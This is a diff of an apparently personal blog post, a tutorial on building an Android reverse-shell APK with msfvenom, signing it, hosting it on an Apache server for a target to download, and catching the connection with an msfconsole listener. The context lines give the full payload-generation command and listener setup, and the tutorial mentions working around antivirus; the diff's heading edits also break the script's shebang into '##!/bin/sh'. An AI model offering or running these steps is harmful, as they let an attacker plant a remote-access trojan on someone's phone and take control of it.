@@ -25,7 +25,7 @@ As you can see something is not correct, more specifically "**R**" is not recogn
 
 This is just a simple tip to take these tutorials as they are right now, because after one year they could already be outdated, even this tutorial created by me of course. If something is not working, check the [documentation](https://www.offensive-security.com/metasploit-unleashed/).
 
-# Requirements
+## Requirements
 
 It should be obvious but these are the tools required:
 
@@ -48,7 +48,7 @@ Release:        2021.1
 Codename:       kali-rolling
 ```
 
-# Create the payload
+## Create the payload
 
 Instead of typing 7 different commands in the terminal one by one, we can simply create a shell script to do the job. Open the terminal and use the following command to create a file:
 
@@ -64,7 +64,7 @@ $ chmod +x createThePayload.sh
 Copy and paste the following code (of course you have to set your IP and a port like **4444**):
 
 ```sh
-#!/bin/sh
+##!/bin/sh
  
 msfvenom -p android/meterpreter/reverse_tcp LHOST=YOURIP LPORT=YOURPORT -o virus.apk
  
@@ -83,7 +83,7 @@ zipalign -v 4 virus.apk virus_signed.apk
 
 Type **./createThePayload.sh** and hit enter to execute the script, check the output in the terminal to see if everything is correct.
 
-## A quick explanation about the commands used
+### A quick explanation about the commands used
 
 With **MSFvenom** we set the payload, the host which is our IP, the port and the output as "**virus.apk**". 
 
@@ -91,7 +91,7 @@ The **keytool** command is a key and certificate management utility. We set the 
 
 We have to install two packages, **default-jdk** to use the jarsigner in order to sign and verify a Java Archive, **zipalign** which is an archive alignment tool that provides important optimization to Android application (.apk) files. We set the parameter "**-y**" to automatically answer with "yes" to the prompt in the terminal. We need to sign a certificate because Android mobile devices are not allowed to install apps without the appropriately signed certificate. Android devices only install signed .apk files.
 
-# Setup the server
+## Setup the server
 
 Now to download the APK on a target machine, we could use a server with **Apache**, from here we just need to go the correct url, which is something like "**192.168.1.2/virus_signed.apk**". In order to move the APK created by the script in "**/var/www/html**", we need root permissions. Besides using a command like:
 
@@ -134,7 +134,7 @@ And if we search our apk file in the website directory, we can download it:
 
 !["download-apk"](/images/posts/hack-an-android-device-with-msfvenom-and-kali-linux/download-apk.png)
 
-# Setup the listener
+## Setup the listener
 
 And now we have to set our listener with the **msfconsole**, we set the exploit, the payload and the host. The port is already set as 4444 but you change it. After that we will run it and we will download the apk on a mobile device or an emulator, in my case I used my phone. Follow these steps to set the listener:
 
@@ -170,12 +170,12 @@ msf > run
 
 Download the apk on the phone, you need to make sure that your Kali machine and your Android device are on the same network.
 
-# Let's test some commands
+## Let's test some commands
 
 Some commands will not work, but the main purpose of this video is to show how to make this stuff work, you can always change the payload or even make your own payload. Here is a quick demo:
 
 {{< vimeo 559419552 >}}
 
-# TLDR
+## TLDR
 
 With this post you should be able to create a payload for Android, setup a server and a listener to make everything work perfectly. As you can see in the demo, the antivirus is preventing us from installing the APK, in some cases it can also close the connection to our Kali machine. There are other cases where the connection will be closed, unfortunately there isn't a single solution so you will need to try different approaches. Try to check if the architecture used to create the APK is the same used by Android and of course if the antivirus is preventing the payload to work correctly.
